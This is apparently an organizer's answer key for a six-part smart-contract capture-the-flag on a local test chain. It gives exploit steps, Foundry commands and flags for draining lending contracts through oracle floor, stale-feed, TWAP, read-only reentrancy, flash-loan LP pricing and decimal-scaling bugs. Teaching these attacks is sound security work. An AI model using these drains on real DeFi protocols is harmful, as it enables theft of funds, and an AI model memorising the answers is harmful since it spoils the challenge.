# Delphi — full solution (ORGANIZER)

All six are solved on-chain against `http://localhost:8547` as the attacker
(anvil account[1]). The reference exploits are the Foundry scripts in
[../contracts/script/solve/](../contracts/script/solve/); `make check` runs them
all and then asks the dispenser for each flag (it verifies `isSolved()` on-chain).

```bash
export RPC=http://localhost:8547
export PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
SETUP=<addr> forge script script/solve/SolveC1.s.sol:SolveC1 \
  --rpc-url $RPC --private-key $PK --broadcast
```

Setup addresses: scoreboard `GET /` or `GET /challenges`.

---

## 1 — The Floor
The crashed token's feed is clamped to the $1 floor. Deposit the pile of
worthless tokens you were given and borrow the full stablecoin pool.
`deposit(1_000_000e18)` → `borrow(usdx.balanceOf(lending))`.
Flag `ORC{m1n4nsw3r_cl4mp_lun4_fl00r_pr1c3_r3ad}`.

## 2 — The Stale
The vault buys the token at a frozen $100. Sell your entire (really worthless)
balance: `token.approve(vault); vault.sellToken(10_000e18)` → reserves drained.
Flag `ORC{st4l3_f33d_n0_fr3shn3ss_ch3ck_h34rtb34t}`.

## 3 — The Window (needs the clock advanced)
Two phases around a time jump:

```bash
SETUP=<C3> forge script script/solve/SolveC3a.s.sol:SolveC3a --rpc-url $RPC --private-key $PK --broadcast
cast rpc --rpc-url $RPC evm_increaseTime 700
cast rpc --rpc-url $RPC evm_mine
SETUP=<C3> forge script script/solve/SolveC3b.s.sol:SolveC3b --rpc-url $RPC --private-key $PK --broadcast
```

Phase A: `buyToken(9000e18)` pumps spot 1 → ~100 USDX/token and `oracle.update()`
checkpoints. After `PERIOD` (600s) elapses, phase B's `update()` sets the TWAP to
~100, then `deposit(1000e18)` + `borrow(all)` drains the market.
Flag `ORC{tw4p_sh0rt_w1nd0w_t1m3_w31ght3d_m4n1p}`.

## 4 — The Mirror (read-only reentrancy)
Deploy an attacker contract, move your 900 LP into it, then
`pwn(10e18, 890e18, 100e18)`: it deposits 10 LP as collateral and calls
`removeLiquidity(890e18)`; the pool's ETH callback hits the contract's
`receive()`, which calls `desk.borrow(100e18)` while `getVirtualPrice()` is
inflated (~10e18 vs a fair 2e18). Desk drained. See
[SolveC4.s.sol](../contracts/script/solve/SolveC4.s.sol).
Flag `ORC{r34d_0nly_r33ntr4ncy_v1rtu4l_pr1c3}`.

## 5 — The Mint (flash-loan LP pricing)
Deploy the attacker contract, move your 500 LP in, then
`pwn(500e18, 3000e18, 2000e18)`. In `onFlashLoan`: swap the 3000 flash USDX into
the pool (LP price 2 → ~4.25), `desk.borrow(2000e18)` against the LP collateral,
swap the token back to recover the USDX, repay the loan. Desk drained. See
[SolveC5.s.sol](../contracts/script/solve/SolveC5.s.sol).
Flag `ORC{n41v3_lp_t0k3n_sp0t_r3s3rv3_pr1c1ng}`.

## 6 — The Scale
The 18-decimal feed divided by `1e8` over-values collateral 1e10×. Deposit one
token, borrow everything: `deposit(1e18)` → `borrow(usdx.balanceOf(lending))`.
Flag `ORC{0r4cl3_d3c1m4ls_sc4l1ng_c0nfus10n_1e10}`.

---

## One-shot

```bash
make up && make check     # -> ALL 6 FLAGS CAPTURED, exit 0
```
